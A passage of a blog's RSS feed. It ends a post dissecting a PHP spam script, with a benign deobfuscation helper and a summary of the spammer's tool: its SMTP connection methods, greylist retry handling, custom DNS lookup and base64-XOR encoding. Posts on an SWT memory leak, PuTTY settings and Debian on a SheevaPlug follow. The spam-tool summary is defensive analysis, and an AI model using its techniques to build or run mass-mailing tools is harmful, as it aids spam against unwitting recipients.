+<p>Let&#8217;s use this mapping with a final decoder script:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="php">$data = file_get_contents($argv[1]);
+$mapping = json_decode(file_get_contents($argv[2]), true);
+
+foreach ($mapping['functions'] as $obfuscated =&gt; $decoded) {
+    $data = str_replace($obfuscated . '(', $decoded . '(', $data);
+}
+
+foreach ($mapping['variables'] as $obfuscated =&gt; $decoded) {
+    $data = str_replace('$' . $obfuscated, '$' . $decoded, $data);
+}
+
+echo $data;</pre>
+<p>Take a look at <a href="/wp-content/uploads/2016/04/step-10-funcs-vars-mapped.txt">the final deobfuscated script</a>! Some variables remain untranslated but their intention is clear. This is probably close enough to what the spammer originally wrote.</p>
+<h2>So what does this spam script do?</h2>
+<p>Basically, the spam script does the following in order:</p>
+<ol>
+<li>Loads victim configuration passed by the spammer as POST variables to this script: <code class="EnlighterJSRAW" data-enlighter-language="php">spam_config_load(&amp;$spam_config)</code></li>
+<li>For every victim address, initialize connection parameters</li>
+<li>Load retry time information from storage: <code class="EnlighterJSRAW" data-enlighter-language="php">retry_storage_read()</code></li>
+<li>Execute the main loop: <code class="EnlighterJSRAW" data-enlighter-language="php">spam_send_messages(&amp;$connections, &amp;$retry_time_storage, $hosts_info)</code>
+<ol>
+<li>Iterate over active connections and perform: <code class="EnlighterJSRAW" data-enlighter-language="php">connection_process(&amp;$connections, &amp;$retry_time_storage, $hosts_info)</code></li>
+<li>A state machine decides on the next action based on the connection&#8217;s current state</li>
+</ol>
+</li>
+<li>Report the result of all spamming actions: <code class="EnlighterJSRAW" data-enlighter-language="php">spam_report($connections)</code></li>
+<li>Store retry information: <code class="EnlighterJSRAW" data-enlighter-language="php">retry_storage_write($retry_time_storage)</code></li>
+</ol>
+<p>A number of things I think are noteworthy about this script:</p>
+<ul>
+<li>The spammers are able to pass along not only the target email addresses of the victims, but also templates for things like the email&#8217;s body and subject.</li>
+<li>Based on what was available in terms of PHP functionality, the script autodetects the best way to connect to an SMTP server:
+<ul>
+<li>Using <a href="https://secure.php.net/manual/en/function.socket-create.php">socket_create()</a></li>
+<li>Using <a href="https://secure.php.net/manual/en/function.fsockopen.php">fsockopen()</a></li>
+<li>Using <a href="https://secure.php.net/manual/en/function.stream-socket-client.php">stream_socket_client()</a></li>
+</ul>
+</li>
+<li>The $pate data structure contains information about different SMTP hosts and the way they indicate grey- and blacklisting. If the script detects that the email was not outright rejected and a retry at some later point in time was in order, it stores this information per host in $retry_time_storage.</li>
+<li>If <a href="https://secure.php.net/manual/en/function.socket-select.php">socket_select()</a> is available, the script maintains a number of simultaneous SMTP sessions and progresses them as soon as data is available to read.</li>
+<li>The user-defined function <code class="EnlighterJSRAW" data-enlighter-language="php">dns_lookup($address)</code> performs a custom written DNS lookup over UDP with the Google DNS (IP: 8.8.8.8) if PHP&#8217;s regular DNS functions are unavailable.</li>
+<li>At certain points in the code a custom base64-plus-xor2 coding is applied. The ordinal values of bytes are XOR&#8217;ed with 2 before they are passed along to base64_encode(). My guess is that they did this so even if you found a value encoded this way, a simple base64_decode() would not be enough to reveal its contents.</li>
+</ul>
+<h2>Final thoughts</h2>
+<p>This is the first time I decoded a spammer&#8217;s script, and I&#8217;m slightly impressed by the technical quality. I would never have expected a state machine, or the amount of socket error codes that are handled gracefully. The custom written DNS lookup with a proper response handling loop also surprised me. Someone was very seriously trying to spam people.</p>
+<p>My question for you: can you find the source of this evil? <a href="mailto:jelle@gmta.nl">Let me know</a>!</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2016/04/dissecting-spammers-spam-script">Dissecting a spammer&#8217;s spam script</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>SWT menu disposal memory leak</title>
+		<link>https://jelleraaijmakers.nl/2015/08/swt-menu-disposal-memory-leak</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Sat, 01 Aug 2015 01:20:21 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Java]]></category>
+		<category><![CDATA[Performance]]></category>
+		<category><![CDATA[Programming]]></category>
+		<category><![CDATA[SWT]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=183</guid>
+
+					<description><![CDATA[<p>SWT is a widget toolkit developed as part of Eclipse that enables you to develop Java desktop applications that use the OS&#8217;s native widgets. It is an immensely useful library and really shines in the area of resource management, which boils down to &#8220;only dispose resources you&#8217;ve created yourself&#8221;. Well, sort of. Rules are fun [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2015/08/swt-menu-disposal-memory-leak">SWT menu disposal memory leak</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><a href="https://www.eclipse.org/swt/">SWT</a> is a widget toolkit developed as part of Eclipse that enables you to develop Java desktop applications that use the OS&#8217;s native widgets. It is an immensely useful library and really shines in the area of resource management, which boils down to &#8220;only dispose resources you&#8217;ve created yourself&#8221;.</p>
+<p>Well, sort of.</p>
+<p><span id="more-183"></span></p>
+<h2>Rules are fun</h2>
+<p>An article from 2001 titled <a href="http://www.eclipse.org/articles/swt-design-2/swt-design-2.html">&#8220;Managing Operating System Resources&#8221;</a> touches the subject of SWT resource disposal and defines a set of rules:</p>
+<ol>
+<li><strong>If you created it, you dispose it.</strong><br />
+Fair enough: if you create a Font instance, you dispose of it when you&#8217;re done with it. Create a Shell? You&#8217;ll be the one to dispose it.</li>
+<li><strong>Disposing the <em>parent</em> disposes the <em>children</em>.</strong><br />
+The SWT Control class has a <em>parent</em> field pointing to a parent control. This parent-child relationship is used for composition, rendering, disposal and more. Because you&#8217;d probably go crazy if you&#8217;d have to dispose of all the controls you&#8217;ve created yourself, this rule helps us dispose all the controls in a Shell, for example. Great! Not all widgets have clear parent-child relationship, however. The article gives us some examples to work with:</p>
+<ul>
+<li>A Composite will dispose of all the Composite&#8217;s children.</li>
+<li>A Menu disposes all underlying MenuItems.</li>
+<li>Disposing a Tree or TreeItem disposes all child items.</li>
+</ul>
+</li>
+<li><strong>Disposing a MenuItem disposes a referenced Menu.<br />
+</strong>MenuItems of type SWT.CASCADE reference a Menu to show when the user selects the item. For convenience, the popup menu is disposed together with the MenuItem.</li>
+<li><strong>Disposing a Control disposes a referenced Menu.<br />
+</strong>Similar to the previous rule, disposing a Control with an active Menu set disposes them both. You set an active menu with .setMenu(&#8230;).</li>
+</ol>
+<h2>Do you really know your parents?</h2>
+<p>Not too much has changed in the 14 years since Carolyn MacLeod and Steve Northover wrote those guidelines. But I discovered that it&#8217;s not always straightforward to apply these rules. For example, why are rules #3 and #4 necessary? To instantiate a cascading menu, you pass the MenuItem as its parent, and rule #2 takes care of disposal! Let&#8217;s take a look at the Menu constructor:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">/**
+ * Constructs a new instance of this class given its parent
+ * (which must be a MenuItem) and sets the style
+ * for the instance so that the instance will be a drop-down
+ * menu on the given parent's parent menu.
+ * (...)
+ */
+public Menu(MenuItem parentItem) {
+    // ...
+}</pre>
+<p>The parameter <em>parentItem</em> and the accompanying docblock seem clear. Let&#8217;s take a look at the constructor we use when we instantiate a Menu for another widget:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">/**
+ * Constructs a new instance of this class given its parent,
+ * and sets the style for the instance so that the instance
+ * will be a popup menu on the given parent's shell.
+ * (...)
+ */
+public Menu(Control parent) {
+	// ...
+}</pre>
+<p>Couldn&#8217;t be clearer than this, right? Well, it turns out the <em>parent</em> relationship Menu has with other widgets is a bit awkward. Let&#8217;s step through the code of the last constructor:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">// Class Menu
+
+public Menu(Control parent) {
+	this (checkNull(parent).menuShell(), SWT.POP_UP);
+}
+
+// Class Control
+
+Decorations menuShell() {
+	return parent.menuShell();
+}
+
+// Class Decorations
+
+Decorations menuShell() {
+	return this;
+}</pre>
+<p>Menu travels up the tree resolving parents until it finds an instance of Decorations, which will then return itself. <em>An instance of Menu will set its parent to the nearest shell of the provided parent. </em>So now we know that disposing the parent you passed to Menu&#8217;s constructor <em>does not always dispose of the Menu!</em><em><br />
+</em></p>
+<h2>Memory leaks <em>and you</em></h2>
+<p>Imagine the following UI setup:</p>
+<ul>
+<li>You design a new Composite widget that displays an image and offers a context menu to save or delete this image. These actions are defined in the widget.</li>
+<li>The context menu is instantiated within the widget, and uses the widget as its parent.</li>
+<li>The Menu is only set using .setMenu(&#8230;) on the widget on a right click of the user&#8217;s mouse.</li>
+<li>The widget is created and disposed within a single shell that stays open.</li>
+</ul>
+<p>This happens:</p>
+<ul>
+<li>The Menu is instantiated and finds the nearest Shell (Decorations) to use as its parent.</li>
+<li>The user does not right click, so .setMenu(&#8230;) never happens.</li>
+<li>The Composite widget is disposed of.</li>
+<li>Because the Menu is not a child of the widget, it is not disposed.</li>
+<li>The MenuItems in the Menu still contain references to the Composite widget.</li>
+</ul>
+<p>And now you have a memory leak:</p>
+<ul>
+<li>The Shell keeps track of its Menus.</li>
+<li>The Menu keeps track of its MenuItems.</li>
+<li>The MenuItems point to a disposed widget.</li>
+<li>The widget potentially has references to many other objects.</li>
+</ul>
+<p>Only when the Shell is disposed, all those Menus in limbo are actually disposed. <em>&#8220;Why not always set the menu with .setMenu(&#8230;)?&#8221;</em>, you ask. Well, then it wouldn&#8217;t be possible to have more than one context menu for the same widget.</p>
+<p>You can find these leaks using the amazing <a href="http://docs.oracle.com/javase/8/docs/technotes/guides/visualvm/">JVisualVM</a>. If you&#8217;ve got a JDK installed, this already sits on your hard drive. Make a heap dump of your process, find a UI class that should have been disposed (sort by instance count), and look for this pattern in the <em>references</em> tab:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-193 size-full" src="https://jelleraaijmakers.nl/wp-content/uploads/2015/08/swt-jvisualvm-references.png" alt="JVisualVM references SWT leak" width="436" height="200" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2015/08/swt-jvisualvm-references.png 436w, https://jelleraaijmakers.nl/wp-content/uploads/2015/08/swt-jvisualvm-references-300x138.png 300w, https://jelleraaijmakers.nl/wp-content/uploads/2015/08/swt-jvisualvm-references-150x69.png 150w" sizes="auto, (max-width: 436px) 100vw, 436px" /><br />
+The references are listed from the widget&#8217;s point of view, so reverse them to discover the leak:</p>
+<ul>
+<li>Display keeps a list of items with event listeners.</li>
+<li>One of these items is a MenuItem with an event listener.</li>
+<li>The event listener points to a lambda used in the MainWordListEditor class.</li>
+<li>The lambda&#8217;s arg$1 field points to the MainWordListEditor instance, which should have been disposed.</li>
+</ul>
+<h2>An additional SWT disposal rule</h2>
+<p>I would like to propose a new rule to take care of all this nasty business:</p>
+<p><strong>If you create a potentially unreferenced menu, you dispose it.</strong></p>
+<p>Or, to put this into code:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="java">Menu menu = new Menu(widget);
+// ...
+widget.addListener(SWT.Dispose, e -&gt; menu.dispose());
+</pre>
+<p>Easy enough!</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2015/08/swt-menu-disposal-memory-leak">SWT menu disposal memory leak</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Serious PuTTY defaults</title>
+		<link>https://jelleraaijmakers.nl/2015/02/serious-putty-defaults</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Mon, 23 Feb 2015 20:58:48 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Servers]]></category>
+		<category><![CDATA[SSH]]></category>
+		<category><![CDATA[Windows]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=157</guid>
+
+					<description><![CDATA[<p>Everybody who has ever used SSH in the vicinity of a computer running Windows knows of the existence of PuTTY, the tiny yet brilliant Swiss army knife of remote communication. These are the chronicles of my default settings. If you happen upon a Windows machine that has not yet had the pleasure of being fitted [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2015/02/serious-putty-defaults">Serious PuTTY defaults</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Everybody who has ever used SSH in the vicinity of a computer running Windows knows of the existence of PuTTY, the tiny yet brilliant Swiss army knife of remote communication. These are the chronicles of my default settings.</p>
+<p><span id="more-157"></span></p>
+<p>If you happen upon a Windows machine that has not yet had the pleasure of being fitted with an SSH client, <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html">bestow it</a> the almighty PuTTY-ness and all your friends will think you&#8217;re awesome.</p>
+<p>All silliness aside, there are probably a lot of great alternatives out there that I haven&#8217;t tried yet. I stubbornly keep using PuTTY and although it&#8217;s a good client, its defaults are somewhat lacking. So today, I would like to share with you my wholly serious PuTTY setting defaults!</p>
+<h2>Preamble</h2>
+<p>PuTTY does not know the concept of inheritance. Both your default settings and your connection profiles are just separate setting containers &#8211; they share nothing with each other. So you should modify your default settings <strong>before</strong> you create profiles, or you&#8217;ll need to update the settings of each and every one of your profiles by hand.</p>
+<p>You load your default settings by opening PuTTY, clicking on <strong>Default Settings</strong> and the <strong>Load</strong> button.</p>
+<h2>Serious defaults</h2>
+<p>These are the settings I always change based on my experience working with a lot of Linux systems:</p>
+<ul>
+<li><strong>Window</strong> &gt; <strong>Lines of scrollback</strong>: 250000<br />Just put an fairly large number there. You&#8217;ll thank me later when that code you accidentally deleted hasn&#8217;t scrolled out of your buffer yet.</li>
+<li><strong>Window</strong> &gt; <strong>Appearance</strong> &gt; <strong>Font</strong>: Lucida Console, Regular, 9pt<br />This is pretty subjective, but give it a shot. Nicely condensed and readable font that gives you lot of workspace.</li>
+<li><strong>Window</strong> &gt; <strong>Colours</strong> &gt; <strong>ANSI Blue</strong>: R: 60, G: 60, B: 255<br /><strong>Window </strong>&gt; <strong>Colours</strong> &gt; <strong>ANSI Blue Bold</strong>: R: 120, G: 120, B: 255<br />One some monitors, PuTTY blue is fine. On most monitors, PuTTY blue is blackish blue. Sun is shining? PuTTY blue could just as well be black. The invisible kind of black.</li>
+<li><strong>Connection</strong> &gt; <strong>Seconds between keepalives</strong>: 20<br /><strong>Connection</strong> &gt; <strong>Enable TCP keepalives</strong>: yes please<br />This keeps your connection active and makes sure no intermediary network devices &#8211; or even the SSH daemon itself &#8211; dares think about dropping your connection in favor of streaming that funny Vine video with that guy doing that thing and then screaming. Don&#8217;t enable these if you noticed your network packets to not reliably reach the other side, because then you&#8217;d be logged out every 20 seconds.</li>
+<li><strong>Connection</strong> &gt; <strong>Data</strong> &gt; <strong>Terminal-type string</strong>: &#8220;linux&#8221;<br />This makes sure your &#8220;arrow up&#8221; is an &#8220;arrow up&#8221; on the other side instead of Ctulhu vomiting all over your terminal.</li>
+<li><strong>Connection</strong> &gt; <strong>SSH</strong> &gt; <strong>Enable compression</strong>: check it<br />This will cost you a tiny bit of CPU time on both sides, but will serve you well when forwarding ports through PuTTY, when you&#8217;re <code class="EnlighterJSRAW" data-enlighter-language="no-highlight">cat</code>ting large text files, or when you&#8217;ve decided that SSH&#8217;ing over a flaky WiFi connection in an apartment building where everyone shares the same channel is by far the best thing to do today.</li>
+<li><strong>Connection</strong> &gt; <strong>SSH</strong> &gt; <strong>Auth</strong> &gt; <strong>Private key file for authentication</strong>: optional<br />Select your private key file here if you use the same key file for multiple SSH connections, or even better: use Pageant to manage your keys!</li>
+<li><strong>Connection</strong> &gt; <strong>SSH</strong> &gt; <strong>X11</strong> &gt; <strong>Enable X11 forwarding</strong>: don&#8217;t mind if I do<br />This only makes sense if you decide to run an X server in Windows, such as <a href="http://www.straightrunning.com/XmingNotes/">Xming</a>. If you do, this enables you to run X applications on the server that are rendered locally on your machine! Slowly, but still!</li>
+</ul>
+<p>Now that you&#8217;ve finally changed all these settings, make sure PuTTY remembers them by going to <strong>Session</strong>, selecting <strong>Default Settings</strong> and clicking the <strong>Save</strong> button.</p>
+<p>Well folks, that&#8217;s all. Tune in next time when I&#8217;ll teach you how to decode SSH packets using only a pencil and a used napkin!</p>
+
+
+<p></p>
+<p>The post <a href="https://jelleraaijmakers.nl/2015/02/serious-putty-defaults">Serious PuTTY defaults</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>SheevaPlug with Debian Wheezy</title>
+		<link>https://jelleraaijmakers.nl/2015/01/sheevaplug-with-debian-wheezy</link>
+		
+		<dc:creator><![CDATA[Jelle]]></dc:creator>
+		<pubDate>Tue, 06 Jan 2015 14:34:31 +0000</pubDate>
+				<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Debian]]></category>
+		<category><![CDATA[Performance]]></category>
+		<category><![CDATA[Servers]]></category>
+		<guid isPermaLink="false">https://jelleraaijmakers.nl/?p=52</guid>
+
+					<description><![CDATA[<p>One of my projects entails running (and developing) network monitoring software on a private uplink. I could use my laptop as a server, but it has a constant energy consumption of about 60 watts which I find a bit much. Enter the SheevaPlug. [Source] The SheevaPlug is a neat little plug computer from GlobalScale Technologies [&#8230;]</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2015/01/sheevaplug-with-debian-wheezy">SheevaPlug with Debian Wheezy</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>One of my projects entails running (and developing) network monitoring software on a private uplink. I could use my laptop as a server, but it has a constant energy consumption of about 60 watts which I find a bit much. Enter the SheevaPlug.</p>
+<p><span id="more-52"></span></p>
+<p style="text-align: center;"><a href="https://jelleraaijmakers.nl/wp-content/uploads/2015/01/SheevaPlug_with_external_drive_enclosure.jpg"><img loading="lazy" decoding="async" class="size-medium wp-image-112 aligncenter" src="https://jelleraaijmakers.nl/wp-content/uploads/2015/01/SheevaPlug_with_external_drive_enclosure-300x200.jpg" alt="SheevaPlug with external drive enclosure" width="300" height="200" srcset="https://jelleraaijmakers.nl/wp-content/uploads/2015/01/SheevaPlug_with_external_drive_enclosure-300x200.jpg 300w, https://jelleraaijmakers.nl/wp-content/uploads/2015/01/SheevaPlug_with_external_drive_enclosure-150x100.jpg 150w, https://jelleraaijmakers.nl/wp-content/uploads/2015/01/SheevaPlug_with_external_drive_enclosure-768x511.jpg 768w, https://jelleraaijmakers.nl/wp-content/uploads/2015/01/SheevaPlug_with_external_drive_enclosure.jpg 800w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a><a href="http://en.wikipedia.org/wiki/SheevaPlug#mediaviewer/File:SheevaPlug_with_external_drive_enclosure.jpg">[Source]</a></p>
+<p>The SheevaPlug is a neat little <a href="http://www.globalscaletechnologies.com/p-46-sheevaplug-dev-kit.aspx">plug computer from GlobalScale Technologies</a> that serves as a development kit. It comes with a 1.2 GHz ARMv5 CPU, 512 MB RAM and integrated 512 MB NAND flash storage. It also features a 1 Gbit/s ethernet port, USB 2.0 connection and an MMC slot. The basic premise is that you take the thing, ram it into the nearest outlet and bask in its glorious Linux-running presence. And it does all that for <a href="http://www.cyrius.com/journal/debian/kirkwood/sheevaplug/power-consumption">a whopping 3 (idle) to 7 (load) watts</a>! I quite liked the idea so a few years ago, I bought two of &#8217;em.</p>
+<p>Unfortunately, 512 MB RAM is not a lot and 512 MB of internal storage is even less when you consider the storage requirements of a modern Linux distribution. Now, I could have gone for a small distribution like <a href="http://www.damnsmalllinux.org/">DSL</a>, but I wanted to have a bit of consistency between my servers so I wouldn&#8217;t have to make a context switch in my head every time I log in into the SheevaPlug.</p>
+<p><a href="https://www.debian.org/">Debian</a> is my favorite go-to Linux distribution. It&#8217;s stable, pretty lightweight by default and I like its configuration system. Also, it <a href="https://www.debian.org/ports/arm/#status">officially supports the SheevaPlug as a target device</a>, which is nice. The default install of a standard system plus SSH requires about 512 MB of disk storage, which is a bit much for the poor SheevaPlug. So I dusted off an old 2 GiB USB flash drive that now serves as the primary drive.</p>
+<h2>Install Debian on a SheevaPlug</h2>
+<p>The goal is to install Debian Wheezy 7.7 on a SheevaPlug with a USB flash drive connected to it. Martin Michlmayr has a lot of <a href="http://www.cyrius.com/debian/kirkwood/sheevaplug/">resources on the SheevaPlug</a>, which I&#8217;ll use in the installation steps below.</p>
+<ol>
+<li>Power on the SheevaPlug.</li>
+<li>Connect the device to your computer using the supplied USB cable. This will create a new serial device and on Windows you might need to install the device drivers for it. You can find those on the disc that came in the box. See <a href="http://mikelev.in/2010/08/connecting-to-sheevaplug-over-serial-with-putty/">this guide by Mike Levin</a> for more information about connecting to the SheevaPlug.</li>
+<li>Connect your SheevaPlug to your LAN with access to internet using an ethernet cable. The Debian (net) installer requires a working internet connection.</li>
+<li>Connect your USB drive using the USB connector on the front of the device.</li>
+<li>Once fully connected, reboot the device by pressing the reset button on the side through the pin hole. Press [any key] as soon as you see the text <strong>&#8220;Hit any key to stop autoboot&#8221;</strong>.</li>
+<li>Type <code class="EnlighterJSRAW" data-enlighter-language="null">version</code> to see the currently installed boot loader version. For example:
+<pre class="EnlighterJSRAW" data-enlighter-highlight="3" data-enlighter-language="generic">Marvell&gt;&gt; version
+
+U-Boot 2011.12 (Mar 11 2012 - 18:59:46)
+Marvell-Sheevaplug - eSATA - SD/MMC
+gcc (Debian 4.6.3-1) 4.6.3
+GNU ld (GNU Binutils for Debian) 2.22</pre>
+<p>If the version you see is anything other than &#8220;U-Boot 2011.12&#8221;, you need to follow <a href="http://cyrius.com/debian/kirkwood/sheevaplug/uboot-upgrade/">this guide</a> in order to upgrade your SheevaPlug&#8217;s boot loader.</li>
+<li>Run the Debian installer <a href="http://www.cyrius.com/debian/kirkwood/sheevaplug/install/">using Martin&#8217;s excellent guide</a>. I can recommend using TFTP but MMC should work equally fine. Just walk through the installation steps like you normally would. For a minimal installation, only select the &#8220;Standard system utilities&#8221; and &#8220;SSH server&#8221; tasks.</li>
+<li>Log in onto your newly installed Debian-powered SheevaPlug using SSH!</li>
+</ol>
+<h2>Improve SheevaPlug performance</h2>
+<p>My USB flash drive gives me pretty low read and write speeds of about 7 MiB/s when reading or writing sequentially. But for random I/O, it really shines in being a worthless heap of junk. Both U-Boot and Debian really show their I/O hunger in a number of places. Additionally, in the current Debian Linux kernel (version 3.2.0-4-kirkwood), the MMC modules are keeping a kworker thread busy whenever a SD card is <strong>not</strong> present in the slot by polling it periodically. Fortunately for us, these issues can be alleviated!</p>
+<ol>
+<li>Log in as root into your SheevaPlug device.</li>
+<li>Greatly decrease the size of your initrd file by modifying two settings in <strong>/etc/initramfs-tools/initramfs.conf</strong>:
+<pre class="EnlighterJSRAW" data-enlighter-language="shell"># Set MODULES to 'dep' so update-initramfs will try to limit itself to modules actually used
+MODULES=dep
+
+# xz compresses much better than gzip, and is only somewhat slower
+COMPRESS=xz</pre>
+<p>Usually, your boot loader spends most of its time reading the initrd file (/boot/uInitrd) which can sometimes take up to 60 seconds! By making these changes, the initrd will shrink in size from an obese 7 MiB to a lean 1.6 MiB making your boot process a whole lot faster.</li>
+<li>If you want to disable MMC support altogether (like I do), create a file <strong>/etc/modprobe.d/mmc.conf</strong> and add these lines:
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">blacklist mvsdio
+blacklist mmc_core</pre>
+<p>This will prevent the MMC modules from being loaded by your kernel and will lower your base CPU usage significantly.</li>
+<li>If you do not want to use IPv6, disable the module by faking the modprobe install. Create a file <strong>/etc/modprobe.d/ipv6.conf</strong> with this line:
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">install ipv6 /bin/true</pre>
+<p>This will trick modprobe and the initramfs tools into thinking ipv6 is installed and loaded correctly. Disabling IPv6 will probably only lower your memory usage slightly.</li>
+<li>Run <code class="EnlighterJSRAW" data-enlighter-language="null">depmod -ae</code> to update your module dependencies.</li>
+<li>Run <code class="EnlighterJSRAW" data-enlighter-language="null">update-initramfs -u</code> to generate a new <strong>/boot/uInitrd </strong>file. Note that your previous initrd gets backed up to <strong>uInitrd.bak</strong>, so mistakes are easily reverted.</li>
+<li>Edit <strong>/etc/rsyslog.conf</strong> and comment the log lines not pertaining to syslog:
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">#
+# First some standard log files.  Log by facility.
+#
+#auth,authpriv.*            /var/log/auth.log
+*.*;auth,authpriv.none      -/var/log/syslog
+#cron.*             /var/log/cron.log
+#daemon.*           -/var/log/daemon.log
+#kern.*             -/var/log/kern.log
+#lpr.*              -/var/log/lpr.log
+#mail.*             -/var/log/mail.log
+#user.*             -/var/log/user.log</pre>
+<p>This will help with keeping logging I/O to a minimum. The downside is that you&#8217;ll need to wade through <strong>/var/log/syslog</strong> from now on.</li>
+<li>Replace <strong>exim4</strong> with <strong>ssmtp</strong> if you only want simple outbound emails through a smarthost:
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">apt-get install ssmtp</pre>
+<p>Ssmtp is lightweight and does not run as a daemon &#8211; like exim4 &#8211; but is executed inline as <code class="EnlighterJSRAW" data-enlighter-language="null">mail</code>. Put your SMTP server in <strong>/etc/ssmtp/ssmtp.conf</strong>.</li>
+<li>Want to trim some more fat off of your installation? Why don&#8217;t you install <strong>debfoster</strong> and run it to discover all the things you don&#8217;t need in a minimal Debian install:
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">apt-get install debfoster
+debfoster</pre>
+<p>This tool enumerates all packages that are not dependencies of other packages (&#8220;foster&#8221; packages). Using [p] you can delete the package and all its dependent packages. I recommend purging<strong> nfs-common</strong>, <strong>installation-report</strong>, <strong>task-english</strong>, <strong>db5.1-util</strong> and <strong>eject</strong>. This will probably result in two fewer daemons running on your device.</li>
+<li>Do a <code class="EnlighterJSRAW" data-enlighter-language="null">reboot</code> and enjoy all your newfound performance!</li>
+</ol>
+<p>Have fun with this plug computer, and please <a href="mailto:jelle@gmta.nl">contact me</a> if you found this guide useful or have any remarks.</p>
+<p>The post <a href="https://jelleraaijmakers.nl/2015/01/sheevaplug-with-debian-wheezy">SheevaPlug with Debian Wheezy</a> appeared first on <a href="https://jelleraaijmakers.nl">Our Technical Narrative</a>.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+	</channel>
+</rss>
